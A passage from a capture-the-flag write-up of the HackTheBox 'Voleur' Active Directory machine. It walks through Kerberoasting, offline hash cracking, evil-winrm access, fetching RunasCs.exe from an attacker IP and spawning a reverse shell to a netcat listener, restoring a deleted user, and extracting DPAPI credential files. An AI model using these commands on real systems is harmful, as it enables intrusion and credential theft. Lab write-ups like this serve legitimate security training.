</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN removed successfully <span class=k>for</span> <span class=o>(</span>svc_winrm<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>The targeted Kerberoasting attack leveraged the WriteSPN permission to set arbitrary Service Principal Names on target accounts, then requested Kerberos service tickets for these accounts. This technique allows attackers to obtain encrypted ticket-granting service tickets that can be cracked offline to recover plaintext passwords.</p><p><strong>Hashes Retrieved:</strong></p><ul><li><p><strong>lacey.miller:</strong>¬†<em>krb</em>5<em>tgs</em>23‚àó<em>lacey</em>.<em>miller</em>&mldr;</p><p>krb5tgs</p><p>‚àólacey.miller</p></li><li><p><strong>svc_winrm:</strong>¬†<em>krb</em>5<em>tgs</em>23‚àó<em>svcwinrm</em>&mldr;</p><p>krb5tgs</p><p>‚àósvcwinrm</p></li></ul><p>The successful extraction of Kerberos ticket hashes for both lacey.miller and svc_winrm provided offline cracking targets. These Type 23 tickets use RC4 encryption, which is more vulnerable to cracking than newer encryption methods like AES.</p><p><strong>3.4 Hash Cracking</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# john --wordlist<span class=o>=</span>/home/hexhunter404/Downloads/rockyou.txt svc_winrm_hash.txt --format<span class=o>=</span>krb5tgs
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>krb5tgs, Kerberos <span class=m>5</span> TGS etype <span class=m>23</span> <span class=o>[</span>MD4 HMAC-MD5 RC4<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>AFireInsidedeOzarctica980219afi <span class=o>(</span>?<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:08 DONE <span class=o>(</span>2025-07-05 23:48<span class=o>)</span> 0.1117g/s 1281Kp/s 1281Kc/s 1281KC/s AHAMDAKMAL..AFIROCKS!
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed. 
</span></span></code></pre></td></tr></table></div></div><p><strong>Password Found:</strong>¬†AFireInsidedeOzarctica980219afi</p><p>The recovered password &ldquo;AFireInsidedeOzarctica980219afi&rdquo; appeared to be a combination of song lyrics or band name with additional characters, representing a common pattern where users create passwords they consider complex but are still vulnerable to wordlist attacks.</p><p><strong>3.5 WinRM Access</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi 
</span></span><span class=line><span class=cl>2025-07-06 06:45:25.382677 <span class=o>(</span>+0200<span class=o>)</span> +28799.807445 +/- 0.013519 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28799.807445
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in svc_winrm.ccache
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> evil-winrm -i DC.voleur.htb -r VOLEUR.HTB
</span></span><span class=line><span class=cl>2025-07-06 06:46:56.688599 <span class=o>(</span>+0200<span class=o>)</span> +28803.921600 +/- 0.013948 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28803.921600
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class=sb>`</span>quoting_detection_proc<span class=err>&#39;</span> <span class=k>for</span> module Reline                                                                                                      
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm&gt; <span class=nb>cd</span> Desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>esktop&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>-a----         1/29/2025   7:07 AM           <span class=m>2312</span> Microsoft Edge.lnk
</span></span><span class=line><span class=cl>-ar---          7/5/2025   8:38 PM             <span class=m>34</span> user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>esktop&gt; <span class=nb>type</span> user.txt
</span></span><span class=line><span class=cl>9ead16ec422a36bbec3e8eb539ea2d77
</span></span></code></pre></td></tr></table></div></div><p>The successful WinRM connection established interactive PowerShell access to the domain controller. WinRM access provides significant capabilities for system administration and reconnaissance, as it allows execution of PowerShell commands with the privileges of the authenticated user.</p><p><strong>User Flag Retrieved:</strong>¬†9ead16ec422a36bbec3e8eb539ea2d77</p><hr><h2 id=phase-4-dpapi-exploitation><strong>Phase 4: DPAPI Exploitation</strong><a hidden class=anchor aria-hidden=true href=#phase-4-dpapi-exploitation>#</a></h2><p>I started looking around and found that there is a folder beloging to todd.wolfe in C:\Users but inaccessible with svc_winrm as well as the share C:\IT</p><p>I tried to see the deleted users but didn‚Äôt have the required privileges with svc_winrm</p><p><strong>4.1 Custom Runas Tool</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>d-----          6/5/2025   3:30 PM                Administrator
</span></span><span class=line><span class=cl>d-----         1/29/2025   7:11 AM                jeremy.combs
</span></span><span class=line><span class=cl>d-r---         1/28/2025  12:35 PM                Public
</span></span><span class=line><span class=cl>d-----         1/30/2025   3:39 AM                svc_backup
</span></span><span class=line><span class=cl>d-----         1/29/2025   4:47 AM                svc_ldap
</span></span><span class=line><span class=cl>d-----         1/29/2025   7:07 AM                svc_winrm
</span></span><span class=line><span class=cl>d-----         1/29/2025   4:53 AM                todd.wolfe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers&gt; <span class=nb>cd</span> todd.wolfe
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\t</span>odd.wolfe&gt; dir
</span></span><span class=line><span class=cl>Access to the path <span class=s1>&#39;C:\Users\todd.wolfe&#39;</span> is denied.
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ dir
</span></span><span class=line><span class=cl>+ ~~~
</span></span><span class=line><span class=cl>    + CategoryInfo          : PermissionDenied: <span class=o>(</span>C:<span class=se>\U</span>sers<span class=se>\t</span>odd.wolfe:String<span class=o>)</span> <span class=o>[</span>Get-ChildItem<span class=o>]</span>, UnauthorizedAccessException
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\t</span>odd.wolfe&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers&gt; <span class=nb>cd</span> svc_backup
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_backup&gt; dir
</span></span><span class=line><span class=cl>Access to the path <span class=s1>&#39;C:\Users\svc_backup&#39;</span> is denied.
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ dir
</span></span><span class=line><span class=cl>+ ~~~
</span></span><span class=line><span class=cl>    + CategoryInfo          : PermissionDenied: <span class=o>(</span>C:<span class=se>\U</span>sers<span class=se>\s</span>vc_backup:String<span class=o>)</span> <span class=o>[</span>Get-ChildItem<span class=o>]</span>, UnauthorizedAccessException
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_backup&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers&gt; <span class=nb>cd</span> jeremy_combs
</span></span><span class=line><span class=cl>Cannot find path <span class=s1>&#39;C:\Users\jeremy_combs&#39;</span> because it does not exist.
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ <span class=nb>cd</span> jeremy_combs
</span></span><span class=line><span class=cl>+ ~~~~~~~~~~~~~~~
</span></span><span class=line><span class=cl>    + CategoryInfo          : ObjectNotFound: <span class=o>(</span>C:<span class=se>\U</span>sers<span class=se>\j</span>eremy_combs:String<span class=o>)</span> <span class=o>[</span>Set-Location<span class=o>]</span>, ItemNotFoundException
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; Get-ADObject -IncludeDeletedObjects -Filter <span class=s1>&#39;IsDeleted -eq $true -and ObjectClass -eq &#34;user&#34;&#39;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; Invoke-WebRequest -Uri <span class=s2>&#34;http://10.10.14.173:8081/RunasCs.exe&#34;</span> -OutFile <span class=s2>&#34;runas.exe&#34;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; runas.exe svc_ldap <span class=s1>&#39;M1XyC9pW7qT5Vn&#39;</span> <span class=s2>&#34;cmd.exe&#34;</span> -r 10.10.14.173:8084
</span></span></code></pre></td></tr></table></div></div><p>The discovery of a custom runas executable in the svc_winrm Documents folder suggested administrative tools or scripts left by system administrators. This tool provided the capability to execute commands as the svc_ldap user, effectively allowing impersonation and access to resources that svc_ldap could access.</p><p><strong>4.2 Deleted User Discovery (cf.</strong> <a href=https://activedirectorypro.com/restore-deleted-active-directory-user/>https://activedirectorypro.com/restore-deleted-active-directory-user/</a>)</p><p>With our netcat listening on port 8084</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# nc -lvnp <span class=m>8084</span>                                                                                                                                
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>8084</span>
</span></span><span class=line><span class=cl>Connection received on 10.129.196.199 <span class=m>59702</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.20348.3807<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>voleur<span class=se>\s</span>vc_ldap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;powershell
</span></span><span class=line><span class=cl>powershell
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; Get-ADObject -IncludeDeletedObjects -Filter <span class=s1>&#39;IsDeleted -eq $true -and ObjectClass -eq &#34;user&#34;&#39;</span>
</span></span><span class=line><span class=cl>Get-ADObject -IncludeDeletedObjects -Filter <span class=s1>&#39;IsDeleted -eq $true -and ObjectClass -eq &#34;user&#34;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Deleted           : True
</span></span><span class=line><span class=cl>DistinguishedName : <span class=nv>CN</span><span class=o>=</span>Todd Wolfe<span class=se>\0</span>ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN<span class=o>=</span>Deleted Objects,DC<span class=o>=</span>voleur,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>Name              : Todd Wolfe
</span></span><span class=line><span class=cl>                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
</span></span><span class=line><span class=cl>ObjectClass       : user
</span></span><span class=line><span class=cl>ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; Restore-ADObject -Identity <span class=s2>&#34;CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Restore-ADObject -Identity <span class=s2>&#34;CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb&#34;</span>
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; 
</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; net user /domain
</span></span><span class=line><span class=cl>net user /domain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User accounts <span class=k>for</span> <span class=se>\\</span>DC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>Administrator            krbtgt                   svc_ldap                 
</span></span><span class=line><span class=cl>todd.wolfe               
</span></span><span class=line><span class=cl>The <span class=nb>command</span> completed successfully.
</span></span></code></pre></td></tr></table></div></div><p>The PowerShell query for deleted Active Directory objects revealed the presence of Todd Wolfe&rsquo;s deleted account. Deleted accounts often retain valuable data and credentials, as administrators may not properly clean up associated files and profiles when accounts are removed.</p><p><strong>Found:</strong>¬†Todd Wolfe (deleted user)</p><p>The account of Todd Wolfe was successfully restrored. Todd Wolfe is member of Second-Line Support</p><p><img alt="Todd Wolfe on Bloodhound" loading=lazy src=/images/writeups/htb/voleur/todd_wolfe.png></p><p>Once restored, we run runas.exe one more time to get access as todd.wolfe</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>hexhunter404„âøkali<span class=o>)</span>-<span class=o>[</span>~/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ$ nc -lvnp <span class=m>8092</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>8092</span>
</span></span><span class=line><span class=cl>Connection received on 10.129.196.199 <span class=m>61323</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.20348.3807<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>voleur<span class=se>\t</span>odd.wolfe
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;powershell
</span></span><span class=line><span class=cl>powershell
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span></code></pre></td></tr></table></div></div><p>Nothing was really interesting found inside C:\Users\todd.wolfe</p><p>Next step is to explore C:\IT\Second-Line Support now that we have access to the folder.</p><p><strong>4.3 Archived Profile Discovery</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; <span class=nb>cd</span> <span class=s2>&#34;C:\IT\Second-Line Support\Archived Users&#34;</span>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; Get-ChildItem -Recurse -Force -Hidden
</span></span></code></pre></td></tr></table></div></div><p>The exploration of archived user profiles revealed that the organization maintained copies of user data even after account deletion. This practice, while potentially useful for data recovery, creates significant security risks as it preserves sensitive information including cached credentials and DPAPI-protected data.</p><p>An important hidden folder discovered was (S-1-5-21-3927696377-1337352550-2781715495-1110 being the sid of todd.wolfe):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>4.4 DPAPI Files Extraction</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-smbclient -k <span class=s1>&#39;voleur.htb/todd.wolfe@dc.voleur.htb&#39;</span> -no-pass
</span></span><span class=line><span class=cl>2025-07-06 22:18:36.728139 <span class=o>(</span>+0200<span class=o>)</span> +28799.988984 +/- 0.009491 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28799.988984
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Type <span class=nb>help</span> <span class=k>for</span> list of commands
</span></span><span class=line><span class=cl><span class=c1># shares</span>
</span></span><span class=line><span class=cl>ADMIN$
</span></span><span class=line><span class=cl>C$
</span></span><span class=line><span class=cl>Finance
</span></span><span class=line><span class=cl>HR
</span></span><span class=line><span class=cl>IPC$
</span></span><span class=line><span class=cl>IT
</span></span><span class=line><span class=cl>NETLOGON
</span></span><span class=line><span class=cl>SYSVOL
</span></span><span class=line><span class=cl><span class=c1># use IT</span>
</span></span><span class=line><span class=cl><span class=c1># cd Second-Line Support</span>
</span></span><span class=line><span class=cl><span class=c1># cd Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110</span>
</span></span><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 16:13:09 <span class=m>2025</span> .
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 16:13:09 <span class=m>2025</span> ..
</span></span><span class=line><span class=cl>-rw-rw-rw-        <span class=m>740</span>  Wed Jan <span class=m>29</span> 14:09:25 <span class=m>2025</span> 08949382-134f-4c63-b93c-ce52efc0aa88
</span></span><span class=line><span class=cl>-rw-rw-rw-        <span class=m>900</span>  Wed Jan <span class=m>29</span> 13:53:08 <span class=m>2025</span> BK-VOLEUR
</span></span><span class=line><span class=cl>-rw-rw-rw-         <span class=m>24</span>  Wed Jan <span class=m>29</span> 13:53:08 <span class=m>2025</span> Preferred
</span></span><span class=line><span class=cl><span class=c1># get 08949382-134f-4c63-b93c-ce52efc0aa88</span>
</span></span><span class=line><span class=cl><span class=c1># get BK-VOLEUR</span>
</span></span><span class=line><span class=cl><span class=c1># get Preferred</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># cd Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials</span>
</span></span><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 16:13:09 <span class=m>2025</span> .
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 16:13:09 <span class=m>2025</span> ..
</span></span><span class=line><span class=cl>-rw-rw-rw-        <span class=m>398</span>  Wed Jan <span class=m>29</span> 14:13:50 <span class=m>2025</span> 772275FAD58525253490A9B0039791D3
</span></span><span class=line><span class=cl><span class=c1># get 772275FAD58525253490A9B0039791D3</span>
</span></span><span class=line><span class=cl><span class=c1># exit</span>
</span></span></code></pre></td></tr></table></div></div><p>The extraction of DPAPI (Data Protection API) files represented a sophisticated attack vector. DPAPI is Windows&rsquo; mechanism for protecting sensitive data like saved passwords and certificates. The files extracted included the master key file, backup key, and preferred key, which together could decrypt stored credentials.</p><p><strong>4.5 DPAPI Decryption</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# impacket-dpapi masterkey -file  08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14 -sid S-1-5-21-3927696377-1337352550-2781715495-1110
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>MASTERKEYFILE<span class=o>]</span>
